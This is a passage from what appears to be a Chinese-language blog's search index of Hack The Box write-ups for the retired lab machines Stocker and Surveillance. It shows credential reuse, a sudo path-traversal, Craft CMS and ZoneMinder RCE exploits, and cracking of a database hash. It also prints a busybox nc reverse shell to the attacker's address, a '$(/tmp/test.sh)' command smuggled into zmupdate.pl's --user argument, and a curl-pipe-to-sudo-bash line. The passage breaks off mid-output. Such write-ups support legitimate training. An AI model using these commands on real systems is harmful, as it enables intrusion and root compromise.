production\nconst dbURI = \"mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&amp;w=1\";\n</code></pre></p> <p>\u8981\u4e0d\u662f\u8bba\u575b\u91cc\u4e5f\u76f4\u63a5\u8bf4\u4e86\u8fd9\u662f\u7528\u6237angoose\u7684\u5bc6\u7801\uff0c\u6211\u8fd8\u4ee5\u4e3a\u662fdev\u7684\u5462\u2026\u2026\u4e0d\u8fc7passwd\u91cc\u5012\u662f\u4e5f\u6ca1\u6709dev\u7528\u6237\uff0c\u4e5f\u53ea\u6709angoose\u6700\u503c\u5f97\u4e00\u8bd5\u4e86\u2026\u2026</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Stocker/#flag-user","title":"flag: user","text":"<p>SSH\u8fde\u63a5\u540e\uff0c\u83b7\u5f97\u7528\u6237flag\uff1a</p> <pre><code>\u2514\u2500$ ssh angoose@10.10.11.196\n\u2026\u2026\nLast login: Sat May 27 18:56:20 2023 from 10.10.14.8\nangoose@stocker:~$ id\nuid=1001(angoose) gid=1001(angoose) groups=1001(angoose)\nangoose@stocker:~$ ls\nexploit.js  user.txt\nangoose@stocker:~$ cat user.txt \ne014\u2026\u2026850c\n</code></pre>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Stocker/#privilege-escalation","title":"Privilege Escalation","text":"<p>\u77e5\u9053\u5f53\u524d\u7528\u6237\u7684\u5bc6\u7801\uff0c\u6240\u4ee5\u5148\u770b\u770b <code>sudo -l</code>\uff1a <pre><code>angoose@stocker:~$ sudo -l\n[sudo] password for angoose: \nMatching Defaults entries for angoose on stocker:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser angoose may run the following commands on stocker:\n    (ALL) /usr/bin/node /usr/local/scripts/*.js\n</code></pre></p> <p>\u53ef\u4ee5\u6267\u884c.js\u811a\u672c\uff0c\u867d\u7136\u770b\u4e0a\u53bb\u6307\u5b9a\u4e86\u76ee\u5f55\uff0c\u4e0d\u8fc7\u7531\u4e8e\u901a\u914d\u7b26\uff0c\u6211\u4eec\u53ef\u4ee5\u81ea\u7531\u63a7\u5236\u76ee\u5f55\u79fb\u52a8\u3002</p> <p>\u5514\u2026\u2026\u4e0d\u592a\u4f1ajs\u7684\u811a\u672c\u3002 \u4e0d\u8fc7\u5b9e\u9645\u4e0a\uff0c\u521a\u767b\u5165SSH\u770b\u5f53\u524d\u76ee\u5f55\u7684\u6587\u4ef6\u65f6\u5c31\u53d1\u73b0\u4e00\u4e2a <code>exploit.js</code>\uff1a <pre><code>angoose@stocker:~$ cat exploit.js \nconst fs = require('fs');\nfs.readFile('/root/root.txt', 'utf8', (err, data) =&gt; {\n if (err) throw err;\n console.log(data);\n});\n</code></pre></p> <p>\u5e94\u8be5\u662f\u4e4b\u524d\u7684\u73a9\u5bb6\u7559\u4e0b\u7684\uff0c\u7528\u4e86\u7528\u4e86\uff01</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Stocker/#flag-root","title":"flag: root","text":"<pre><code>angoose@stocker:~$ sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/exploit.js \n[sudo] password for angoose: \na6c0\u2026\u2026e3b1\n</code></pre>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Stocker/#_5","title":"\u603b\u7ed3\u00b7\u540e\u8bb0","text":"<p>2023/05/28</p> <p>\u2026\u2026</p> <p>\u5b8c\u5168\u662fjs\u7cfb\u5217\u7684\u9776\u673a</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Surveillance/","title":"HTB-Surveillance","text":"","tags":["HTB/Linux","HTB/Medium"]},{"location":"writeup/retired/HTB-Surveillance/#summary","title":"Summary","text":"","tags":["HTB/Linux","HTB/Medium"]},{"location":"writeup/retired/HTB-Surveillance/#relevant-skills","title":"Relevant Skills","text":"<ul> <li>nmap</li> <li>CVE</li> <li>mysql</li> <li>JTR</li> <li>Port Forwarding(SSH tunnel)</li> <li>Code review</li> </ul>","tags":["HTB/Linux","HTB/Medium"]},{"location":"writeup/retired/HTB-Surveillance/#attack-path-overview","title":"Attack Path Overview","text":"","tags":["HTB/Linux","HTB/Medium"]},{"location":"writeup/retired/HTB-Surveillance/#external-recon-nmap","title":"External Recon - nmap","text":"<p>\u81ea\u7528\u626b\u63cf\u811a\u672c\uff1a\u5de5\u4f5c\u6d41 <code>curl -s https://raw.githubusercontent.com/TimeLess613/workflow-scan4HTB/main/workflow-scan4HTB.sh | sudo bash -s 10.10.11.245</code></p> <p>\u5f00\u653e\u7aef\u53e3\uff1a <pre><code>PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n</code></pre></p>","tags":["HTB/Linux","HTB/Medium"]},{"location":"writeup/retired/HTB-Surveillance/#_1","title":"\u653b\u51fb\u8def\u5f84\u89c4\u5212\u00b7\u6f0f\u6d1e\u5206\u6790","text":"<p>\u5e38\u89c4\u7b80\u5355\u9776\u673a\uff0c22\u7aef\u53e3SSH\u7684\u7248\u672c\u8f83\u65b0\uff0c\u4f18\u5148\u5ea6\u653e\u4f4e\u3002\u5148\u770b80\u7aef\u53e3\u7684Web\u3002</p>","tags":["HTB/Linux","HTB/Medium"]},{"location":"writeup/retired/HTB-Surveillance/#80","title":"80\u7aef\u53e3","text":"<p>\u8bbf\u95ee\u540e\u67e5\u770b\u7f51\u9875\u6e90\u7801\u53d1\u73b0\u7248\u672c\uff0c\u8c37\u6b4c\u4e00\u6ce2\u53d1\u73b0CVE\u3002</p> <p>Powered by Craft CMS</p>","tags":["HTB/Linux","HTB/Medium"]},{"location":"writeup/retired/HTB-Surveillance/#initial-access","title":"Initial Access","text":"","tags":["HTB/Linux","HTB/Medium"]},{"location":"writeup/retired/HTB-Surveillance/#poc-cve-2023-41892","title":"PoC (CVE-2023-41892)","text":"<p>https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226</p> <pre><code>\u2514\u2500$ python CVE-2023-41892.py \"http://surveillance.htb/\"\n[-] Get temporary folder and document root ...\n&lt;i&gt;no value&lt;/i&gt;,   /var/www/html/craft/web\n[-] Write payload to temporary file ...\n[-] Trigger imagick to write shell ...\n[-] Done, enjoy the shell\n$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n</code></pre> <p>getshell\uff0c\u4e0d\u8fc7\u6709\u70b9\u95ee\u9898\uff0c\u53d1\u73b0\u4f3c\u4e4e\u6709\u4e9b\u9650\u5236\uff0c\u4f8b\u5982\u65e0\u6cd5\u79fb\u52a8\u76ee\u5f55\u3002\u4e8e\u662f\u518d\u8fd0\u884c\u4e86\u4e2a\u53cd\u5f39shell\u547d\u4ee4\uff0ckali\u63a5\u6536\uff1a <pre><code>\u2514\u2500$ nc -lvnp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.14.12] from (UNKNOWN) [10.10.11.245] 43280\nwww-data@surveillance:~/html/craft/web/cpresources$ id\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n</code></pre></p>","tags":["HTB/Linux","HTB/Medium"]},{"location":"writeup/retired/HTB-Surveillance/#mysql","title":"MySQL\u4fe1\u606f\u6cc4\u6f0f","text":"<p>\u7a0d\u5fae\u5728\u8fd9\u4e2aweb\u9879\u76ee\u6587\u4ef6\u5939\u9644\u8fd1\u63a2\u7d22\u4e00\u4e0b\uff0c\u53d1\u73b0mysql\u51ed\u636e\u3002\u770b\u4e86\u773c\u672c\u5730\u76d1\u542c\u7aef\u53e3\u67093306\uff0c\u9042\u8fde\u63a5mysql\u770b\u770b\uff1a <pre><code>www-data@surveillance:~/html/craft$ cat .env\n (...)\n# Database connection settings\nCRAFT_DB_DRIVER=mysql\nCRAFT_DB_SERVER=127.0.0.1\nCRAFT_DB_PORT=3306\nCRAFT_DB_DATABASE=craftdb\nCRAFT_DB_USER=craftuser\nCRAFT_DB_PASSWORD=CraftCMSPassword2023!\nCRAFT_DB_SCHEMA=\nCRAFT_DB_TABLE_PREFIX=\n\n# General settings (see config/general.php)\nDEV_MODE=false\nALLOW_ADMIN_CHANGES=false\nDISALLOW_ROBOTS=false\n\nPRIMARY_SITE_URL=http://surveillance.htb/\n\nwww-data@surveillance:~/html/craft$ ss -anotl\nState  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess\nLISTEN 0      511        127.0.0.1:8080      0.0.0.0:*          \nLISTEN 0      511          0.0.0.0:80        0.0.0.0:*          \nLISTEN 0      4096   127.0.0.53%lo:53        0.0.0.0:*          \nLISTEN 0      128          0.0.0.0:22        0.0.0.0:*          \nLISTEN 0      5            0.0.0.0:8000      0.0.0.0:*          \nLISTEN 0      80         127.0.0.1:3306      0.0.0.0:*          \nLISTEN 0      128             [::]:22           [::]:*          \nwww-data@surveillance:~/html/craft$ which mysql\n/usr/bin/mysql\nwww-data@surveillance:~/html/craft$ mysql -u craftuser -p craftdb\nEnter password: \nERROR 1045 (28000): Access denied for user 'craftuser'@'localhost' (using password: YES)\n\n\nwww-data@surveillance:~/html/craft$ mysql -h 127.0.0.1 -u craftuser -p craftdb\nEnter password: \nReading table information for completion of table and column names\nYou can turn off this feature to get a quicker startup with -A\n\nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MariaDB connection id is 123\nServer version: 10.6.12-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04\n\nCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nMariaDB [craftdb]&gt; show databases;\n+--------------------+\n| Database           |\n+--------------------+\n| craftdb            |\n| information_schema |\n+--------------------+\n2 rows in set (0.001 sec)\n\nMariaDB [craftdb]&gt; show tables;\n+----------------------------+\n| Tables_in_craftdb          |\n+----------------------------+\n| addresses                  |\n| announcements              |\n| assetindexdata             |\n| assetindexingsessions      |\n| assets                     |\n| categories                 |\n| categorygroups             |\n| categorygroups_sites       |\n| changedattributes          |\n| changedfields              |\n| content                    |\n| craftidtokens              |\n| deprecationerrors          |\n| drafts                     |\n| elements                   |\n| elements_sites             |\n| entries                    |\n| entrytypes                 |\n| fieldgroups                |\n| fieldlayoutfields          |\n| fieldlayouts               |\n| fieldlayouttabs            |\n| fields                     |\n| globalsets                 |\n| gqlschemas                 |\n| gqltokens                  |\n| imagetransformindex        |\n| imagetransforms            |\n| info                       |\n| matrixblocks               |\n| matrixblocks_owners        |\n| matrixblocktypes           |\n| migrations                 |\n| plugins                    |\n| projectconfig              |\n| queue                      |\n| relations                  |\n| resourcepaths              |\n| revisions                  |\n| searchindex                |\n| sections                   |\n| sections_sites             |\n| sequences                  |\n| sessions                   |\n| shunnedmessages            |\n| sitegroups                 |\n| sites                      |\n| structureelements          |\n| structures                 |\n| systemmessages             |\n| taggroups                  |\n| tags                       |\n| tokens                     |\n| usergroups                 |\n| usergroups_users           |\n| userpermissions            |\n| userpermissions_usergroups |\n| userpermissions_users      |\n| userpreferences            |\n| users                      |\n| volumefolders              |\n| volumes                    |\n| widgets                    |\n+----------------------------+\n63 rows in set (0.001 sec)\n\nMariaDB [craftdb]&gt; select * from users;\n+----+---------+--------+---------+--------+-----------+-------+----------+-----------+-----------+----------+------------------------+--------------------------------------------------------------+---------------------+--------------------+-------------------------+-------------------+----------------------+-------------+--------------+------------------+----------------------------+-----------------+-----------------------+------------------------+---------------------+---------------------+\n| id | photoId | active | pending | locked | suspended | admin | username | fullName  | firstName | lastName | email                  | password                                                     | lastLoginDate       | lastLoginAttemptIp | invalidLoginWindowStart | invalidLoginCount | lastInvalidLoginDate | lockoutDate | hasDashboard | verificationCode | verificationCodeIssuedDate | unverifiedEmail | passwordResetRequired | lastPasswordChangeDate | dateCreated         | dateUpdated         |\n+----+---------+--------+---------+--------+-----------+-------+----------+-----------+-----------+----------+------------------------+--------------------------------------------------------------+---------------------+--------------------+-------------------------+-------------------+----------------------+-------------+--------------+------------------+----------------------------+-----------------+-----------------------+------------------------+---------------------+---------------------+\n|  1 |    NULL |      1 |       0 |      0 |         0 |     1 | admin    | Matthew B | Matthew   | B        | admin@surveillance.htb | $2y$13$FoVGcLXXNe81B6x9bKry9OzGSSIYL7/ObcmQ0CXtgw.EpuNcx8tGe | 2023-10-17 20:42:03 | NULL               | 2023-12-13 02:56:39     |                 1 | 2023-12-13 02:56:39  | NULL        |            1 | NULL             | NULL                       | NULL            |                     0 | 2023-10-17 20:38:29    | 2023-10-11 17:57:16 | 2023-12-13 02:56:39 |\n+----+---------+--------+---------+--------+-----------+-------+----------+-----------+-----------+----------+------------------------+--------------------------------------------------------------+---------------------+--------------------+-------------------------+-------------------+----------------------+-------------+--------------+------------------+----------------------------+-----------------+-----------------------+------------------------+---------------------+---------------------+\n1 row in set (0.001 sec)\n</code></pre></p> <p>\u53d1\u73b0\u7528\u6237 <code>Matthew</code> \u7684\u51ed\u636e\uff0chome\u76ee\u5f55\u4e5f\u6709\u4e2a <code>matthew</code> \u6587\u4ef6\u5939\uff0c\u6240\u4ee5\u76f4\u63a5JTR\u5c1d\u8bd5\u66b4\u7834\u5bc6\u7801\uff1a <pre><code>\u2514\u2500$ cat creds-mysql.txt | grep Matthew | awk -F '|' '{OFS=\":\"; print $11,$14}' | tr -d ' '\nMatthew:$2y$13$FoVGcLXXNe81B6x9bKry9OzGSSIYL7/ObcmQ0CXtgw.EpuNcx8tGe\n\n\u2514\u2500$ cat creds-mysql.txt | grep Matthew | awk -F '|' '{OFS=\":\"; print $11,$14}' | tr -d ' ' &gt; cred-Matthew.txt\n\n\u2514\u2500$ john --wordlist=/usr/share/wordlists/rockyou.txt cred-Matthew.txt\n</code></pre></p> <p>\u8fd0\u884c\u4e86\u4e00\u6bb5\u65f6\u95f4\u89c9\u5f97\u4e0d\u5bf9\uff0c\u5e94\u8be5\u662f\u5154\u5b50\u6d1e\u2026\u2026</p> <p>\u8fd8\u6709\u5f88\u591a\u8868\uff0c\u987a\u4fbf\u770b\u770b\u8fd8\u6709\u54ea\u4e9b\u662f\u6709\u6570\u636e\u7684\u3002\u770b\u8868\u540d\u4e5f\u6ca1\u4ec0\u4e48\u503c\u5f97\u6ce8\u610f\uff0c\u6682\u65f6\u5148\u653e\u653e: <pre><code>MariaDB [craftdb]&gt; SELECT table_name,table_rows FROM information_schema.tables WHERE table_schema = 'craftdb' AND table_rows &gt; 0;\n+-------------------+------------+\n| table_name        | table_rows |\n+-------------------+------------+\n| elements          |         13 |\n| entries           |         12 |\n| queue             |          1 |\n| content           |         13 |\n| fieldlayouttabs   |          2 |\n| searchindex       |         10 |\n| changedattributes |         19 |\n| fieldlayouts      |          2 |\n| entrytypes        |          2 |\n| revisions         |          8 |\n| users             |          1 |\n| projectconfig     |        133 |\n| elements_sites    |         13 |\n| sections_sites    |          2 |\n| widgets           |          4 |\n| migrations        |         30 |\n| resourcepaths     |         31 |\n| sections          |          2 |\n| sessions          |          1 |\n+-------------------+------------+\n19 rows in set (0.002 sec)\n</code></pre></p> <p>\u53c8\u7ffb\u627e\u4e86\u4e00\u4e0b\uff0c\u53d1\u73b0\u4e00\u4e2a\u5907\u4efd\u6587\u4ef6\u5939\u6709\u4e2asql\u7684\u538b\u7f29\u6587\u4ef6\uff1a \u53d1\u73b0 <pre><code>www-data@surveillance:~/html/craft/storage$ ls backups/\nsurveillance--2023-10-17-202801--v4.4.14.sql.zip\n</code></pre></p> <p>\u5c06\u5176\u4e0b\u8f7d\u5230\u672c\u5730\u770b\u770b\uff0c\u641c\u7d22 <code>Matthew</code> \u679c\u7136\u53c8\u6709\u4ed6\u7684\u51ed\u636e\u4fe1\u606f\uff1a <pre><code>\u2514\u2500$ grep Matthew surveillance--2023-10-17-202801--v4.4.14.sql\nINSERT INTO `users` VALUES (1,NULL,1,0,0,0,1,'admin','Matthew B','Matthew','B','admin@surveillance.htb','39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec','2023-10-17 20:22:34',NULL,NULL,NULL,'2023-10-11 18:58:57',NULL,1,NULL,NULL,NULL,0,'2023-10-17 20:27:46','2023-10-11 17:57:16','2023-10-17 20:27:46');\n</code></pre></p> <p>\u518d\u6765\uff0c\u6574\u7406\u540e\u66b4\u7834\uff1a <pre><code>\u2514\u2500$ grep Matthew surveillance--2023-10-17-202801--v4.4.14.sql | awk -F ',' '{OFS=\":\"; print $10,$13}' | tr -d \"'\"\nMatthew:39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec\n\n\u2514\u2500$ grep Matthew surveillance--2023-10-17-202801--v4.4.14.sql | awk -F ',' '{OFS=\":\"; print $10,$13}' | tr -d \"'\" &gt; cred-Matthew.txt\n\n\u2514\u2500$ hash-identifier    \n (...)\n HASH: 39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec\n\nPossible Hashs:\n[+] SHA-256\n[+] Haval-256\n (...)\n\n\n\u2514\u2500$ john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt cred-Matthew.txt \nUsing default input encoding: UTF-8\nLoaded 1 password hash (Raw-SHA256 [SHA256 128/128 AVX 4x])\nNo password hashes left to crack (see FAQ)\n\n\u2514\u2500$ cat hash.txt                                 \n39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec\n\n\u2514\u2500$ john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (Raw-SHA256 [SHA256 128/128 AVX 4x])\nWarning: poor OpenMP scalability for this hash type, consider --fork=8\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nstarcraft122490  (?)     \n1g 0:00:00:00 DONE (2023-12-12 23:28) 2.631g/s 9485Kp/s 9485Kc/s 9485KC/s stefon23..sozardme\nUse the \"--show --format=Raw-SHA256\" options to display all of the cracked passwords reliably\nSession completed. \n</code></pre></p> <p>\u8fd9\u91cc\u633a\u5947\u602a\uff0c\u8bd5\u4e86\u597d\u51e0\u6b21\u3002\u53ea\u80fd\u5355\u653ehash\u800c\u4e0d\u80fd\u52a0\u4e0a\u7528\u6237\u540d\u3002 \u6700\u7ec8\u5f97\u5230\u51ed\u636e\uff1a<code>Matthew:starcraft122490</code></p> <p>\u5c1d\u8bd5SSH\u8fde\u63a5\uff0c\u6ce8\u610f\u8981\u7528\u5c0f\u5199\uff1a <pre><code>\u2514\u2500$ ssh matthew@10.10.11.245\nmatthew@10.10.11.245's password: \nWelcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)\n (...)\nLast login: Wed Dec 13 04:31:19 2023 from 10.10.14.158\nmatthew@surveillance:~$ id\nuid=1000(matthew) gid=1000(matthew) groups=1000(matthew)\n</code></pre></p>","tags":["HTB/Linux","HTB/Medium"]},{"location":"writeup/retired/HTB-Surveillance/#flag-user","title":"flag: user","text":"<pre><code>matthew@surveillance:~$ cat user.txt \nf72b (...) fa09\n</code></pre>","tags":["HTB/Linux","HTB/Medium"]},{"location":"writeup/retired/HTB-Surveillance/#privilege-escalation","title":"Privilege Escalation","text":"","tags":["HTB/Linux","HTB/Medium"]},{"location":"writeup/retired/HTB-Surveillance/#internal-recon","title":"Internal Recon","text":"<p>\u57fa\u7840\u4fe1\u606f\u6536\u96c6\u4e00\u628a\u68ad\uff1a</p> <ul> <li>\u7528\u6237\u5bb6\u76ee\u5f55\u7684\u9690\u85cf\u6587\u4ef6\uff1a\u65e0</li> <li>\u6709\u5f53\u524d\u7528\u6237\u7684\u51ed\u636e\u6240\u4ee5\u5148\u770b\u4e86\u773c <code>sudo -l</code>\uff1a\u6ca1\u6709sudo\u53ef\u6267\u884c</li> <li>SUID\uff1a\u65e0\u7279\u522b\u53d1\u73b0</li> <li>cron\uff1a\u65e0\u7279\u522b\u53d1\u73b0</li> </ul>","tags":["HTB/Linux","HTB/Medium"]},{"location":"writeup/retired/HTB-Surveillance/#8080zoneminder","title":"\u672c\u5730\u7aef\u53e38080\uff1aZoneMinder","text":"<p>\u6839\u636e\u4e4b\u524d\u521a\u7acb\u8db3\u65f6\u67e5\u770b\u7684\u6b63\u5728\u76d1\u542c\u7684\u7aef\u53e3\u4fe1\u606f\uff0c\u672c\u5730\u76d1\u542c\u9664\u4e863306\uff0c\u8fd8\u6709\u4e2a8080\u3002\u6240\u4ee5\u6253\u7b97\u5f00\u4e2aSSH\u96a7\u9053\u770b\u770b\u662f\u4ec0\u4e48\uff1a <pre><code>\u2514\u2500$ ssh -fNCT -L 8080:127.0.0.1:8080 matthew@10.10.11.245\n\n\u2514\u2500$ ss -noptl                                            \nState     Recv-Q    Send-Q       Local Address:Port       Peer Address:Port   Process                              \nLISTEN    0         128              127.0.0.1:8080            0.0.0.0:*       users:((\"ssh\",pid=3440756,fd=5))    \nLISTEN    0         128                  [::1]:8080               [::]:*       users:((\"ssh\",pid=3440756,fd=4))\n</code></pre></p> <p>\u5728kali\u8bbf\u95ee <code>127.0.0.1:8080</code>\uff0c\u663e\u793a\u4e3aZoneMinder\u7684\u767b\u5f55\u754c\u9762\u3002</p> <p></p> <p>\u770b\u4e86\u4e0b\u7f51\u9875\u6e90\u7801\u60f3\u627e\u627e\u7248\u672c\u4fe1\u606f\u6765\u7740\uff0c\u4e0d\u8fc7\u6ca1\u627e\u5230\u3002\u5176\u4e2d\u8fd8\u53d1\u73b0 <code>__csrf_magic</code> \u7684\u56fa\u5b9a\u9690\u85cf\u503c\uff0c\u4e0d\u592a\u6e05\u695a\u662f\u5426\u6709CSRF\u7684\u76f8\u5173\u6f0f\u6d1e\u80fd\u5229\u7528\u3002</p> <p>\u5148\u76f4\u63a5\u8c37\u6b4c <code>ZoneMinder exploit</code> \u770b\u770b\u3002\u53d1\u73b0github\u7684\u8fd9\u4e2a\u3002 \u63d0\u5230\u5728 <code>/zm/index.php</code> \u53ef\u4ee5\u786e\u8ba4ZoneMinder\u7684\u7248\u672c\u3002\u4e0d\u8fc7\u8bd5\u4e86\u4e0b\u5e76\u4e0d\u884c\u3002</p> <p><code>locate zoneminder</code> \u53d1\u73b0\u5f88\u591a\u6587\u4ef6\u5728 <code>/usr/share/zoneminder/</code>\uff0c\u521a\u597d\u5176\u4e2d\u4e5f\u6709 <code>www</code> \u6587\u4ef6\u5939\uff0c\u6240\u4ee5\u731c\u6d4b\u8fd9\u662f\u90e8\u7f72ZoneMinder\u7684\u6587\u4ef6\u5939\u3002\u5176\u5b9e\u4e4b\u524d\u4e5f\u5728 <code>/etc/nginx/sites-enabled/zoneminder.conf</code> \u53d1\u73b0\u4e0b\u9762\u4fe1\u606f\uff0c\u4e0d\u8fc7\u5f53\u65f6\u6ca1\u592a\u5728\u610f\uff1a <pre><code>matthew@surveillance:/usr/share/zoneminder/www$ cat /etc/nginx/sites-enabled/zoneminder.conf \nserver {\n    listen 127.0.0.1:8080;\n\n    root /usr/share/zoneminder/www;\n\n    index index.php;\n</code></pre></p> <p>\u770b\u4e86\u773c\u9879\u76ee\u6587\u4ef6\u5939\u91cc\u4e5f\u7684\u786e\u6ca1\u6709 <code>/zm/</code> \u6587\u4ef6\u5939\u3002\u770b\u4e86\u770bphp\u4ee3\u7801\u4e0e\u914d\u7f6e\uff1a <pre><code>matthew@surveillance:/usr/share/zoneminder/www$ grep -v '^//' index.php | head -n 30\n (...)\nrequire_once('includes/config.php');\nrequire_once('includes/session.php');\nrequire_once('includes/logger.php');\nrequire_once('includes/Server.php');\n\nif ( 0 and ZM\\Logger::fetch()-&gt;debugOn() ) {\n\n\nmatthew@surveillance:/usr/share/zoneminder/www$ grep -v '^//' includes/config.php | head\n&lt;?php\n\ndefine( 'ZM_CONFIG', '/etc/zm/zm.conf' );               // Path to config file\ndefine( 'ZM_CONFIG_SUBDIR', '/etc/zm/conf.d' ); // Path to config subfolder\ndefine( 'ZM_VERSION', '1.36.32' );               // Version\ndefine( 'ZM_DIR_TEMP', '/tmp/zm' );\ndefine( 'ZM_DIR_CACHE', '/var/cache/zoneminder' );\nglobal $configvals;\n\n$configFile = ZM_CONFIG;\n</code></pre></p> <p>\u53d1\u73b0\u7248\u672c <code>1.36.32</code>\u3002 \u6b63\u597d\u548c\u4e0a\u9762github\u7684\u8fd9\u4e2a\u91cc\u8bf4\u7684\u7248\u672c\u4e00\u6837\u3002\u4f46\u662f\u5b9e\u9645\u90e8\u7f72\u7ed3\u6784\u4f3c\u4e4e\u53c8\u548c\u6587\u7ae0\u91cc\u5199\u7684\u7565\u6709\u4e0d\u540c\u3002\u5982\u65e0\u6cd5\u8bbf\u95ee <code>/zm/index.php</code> \u786e\u8ba4ZoneMinder\u7684\u7248\u672c\u3002\u4ee5\u53ca\u867d\u7136\u6ca1\u6709 <code>web/ajax/events.php</code> \u6587\u4ef6\uff0c\u4e0d\u8fc7\u6709 <code>www/ajax/events.php</code>\u3002\u5e94\u8be5\u5bf9\u5e94\u4e00\u4e0b\u5b9e\u9645\u6587\u4ef6\u5939\u7ed3\u6784\u5c31\u53ef\u4ee5\u5229\u7528\uff1f\u4f46\u662f\u770bPoC\u4ee3\u7801\u53d1\u9001\u7684\u8bf7\u6c42\u76ee\u6807URL\u8fd8\u662f  <code>/zm/index.php</code>\uff0c\u6ca1\u6709\u8fd9\u4e2a\u6587\u4ef6\u7684\u8bdd\u4f30\u8ba1\u65e0\u6cd5\u5229\u7528\u2026\u2026</p> <p>\u63a5\u7740github\u641c\u641c <code>ZoneMinder exploit</code>\uff0c\u53d1\u73b0\u4e0b\u9762\u4e24\u4e2a <code>CVE-2023-26035</code> \u7684PoC\uff0c\u7b26\u5408\u6f0f\u6d1e\u7248\u672c\u3002\u770b\u4e86\u4e0b\u4ee3\u7801\u679c\u7136\u662f\u5229\u7528CSRF\u90a3\u4e2a\u503c\u554a\u3002</p> <ol> <li>https://github.com/rvizx/CVE-2023-26035/tree/main</li> <li>https://github.com/m3m0o/zoneminder-snapshots-rce-poc/tree/main</li> </ol>","tags":["HTB/Linux","HTB/Medium"]},{"location":"writeup/retired/HTB-Surveillance/#poc-cve-2023-26035","title":"PoC (CVE-2023-26035)","text":"<p>\u4e0b\u8f7d\u4e0a\u9762\u7b2c\u4e00\u4e2aPoC\u540e\u8fd0\u884c\uff0c\u6210\u529fgetshell\uff1a <pre><code>\u2514\u2500$ nc -lvnp 4445\nlistening on [any] 4445 ...\nconnect to [10.10.14.12] from (UNKNOWN) [10.10.11.245] 48854\nbash: cannot set terminal process group (1107): Inappropriate ioctl for device\nbash: no job control in this shell\nzoneminder@surveillance:/usr/share/zoneminder/www$ id\nid\nuid=1001(zoneminder) gid=1001(zoneminder) groups=1001(zoneminder)\n</code></pre></p> <p>\u5bb6\u76ee\u5f55\u91cc\u5565\u90fd\u6ca1\uff0c\u4e0d\u8fc7\u53d1\u73b0\u65e0\u5bc6\u7801sudo\uff1a <pre><code>zoneminder@surveillance:/usr/share/zoneminder/www$ cd /home     \ncd /home\nzoneminder@surveillance:/home$ ls\nls\nmatthew\nzoneminder\nzoneminder@surveillance:/home$ ls zoneminder\nls zoneminder\nzoneminder@surveillance:/home$ sudo -l\nsudo -l\nMatching Defaults entries for zoneminder on surveillance:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,\n    use_pty\n\nUser zoneminder may run the following commands on surveillance:\n    (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *\n\n\nzoneminder@surveillance:/usr/share/zoneminder/www$ ls /usr/bin/zm*.pl\n/usr/bin/zmaudit.pl        /usr/bin/zmonvif-trigger.pl  /usr/bin/zmtrack.pl\n/usr/bin/zmcamtool.pl      /usr/bin/zmpkg.pl            /usr/bin/zmtrigger.pl\n/usr/bin/zmcontrol.pl      /usr/bin/zmrecover.pl        /usr/bin/zmupdate.pl\n/usr/bin/zmdc.pl           /usr/bin/zmstats.pl          /usr/bin/zmvideo.pl\n/usr/bin/zmfilter.pl       /usr/bin/zmsystemctl.pl      /usr/bin/zmwatch.pl\n/usr/bin/zmonvif-probe.pl  /usr/bin/zmtelemetry.pl      /usr/bin/zmx10.pl\n</code></pre></p> <p>\u5361\u4e86\u3002\u611f\u89c9\u8981\u5206\u6790\u4ee3\u7801\uff0c\u4f46\u662f\u770b\u4e86\u4e0b\u8fd9\u4e9bpl\u6587\u4ef6\u90fd\u662f\u51e0\u767e\u4e0a\u5343\u884c\u7684\uff0c\u7ed3\u679c\u5c31\u5f00\u6446\u4e86\u3002 \u6700\u540e\u770b\u5927\u4f6c\u63d0\u793a\u5b8c\u6210\u63d0\u6743\u6700\u540e\u4e00\u6b65\u3002\u4f3c\u4e4e\u771f\u7684\u8981\u4ee3\u7801\u5ba1\u8ba1\uff0c\u786e\u8ba4\u51fa <code>zmupdate.pl</code> \u662f\u53ef\u4ee5\u5229\u7528\u7684\uff1a <pre><code>zoneminder@surveillance:/tmp$ cat test.sh \nbusybox nc 10.10.14.12 4446 -e bash\nzoneminder@surveillance:/tmp$ sudo /usr/bin/zmupdate.pl --version=1 --user='$(/tmp/test.sh)' --pass=ZoneMinderPassword2023\n\nInitiating database upgrade to version 1.36.32 from version 1\n\nWARNING - You have specified an upgrade from version 1 but the database version found is 1.36.32. Is this correct?\nPress enter to continue or ctrl-C to abort : \n\nDo you wish to take a backup of your database prior to upgrading?\nThis may result in a large file in /tmp/zm if you have a lot of events.\nPress 'y' for a backup 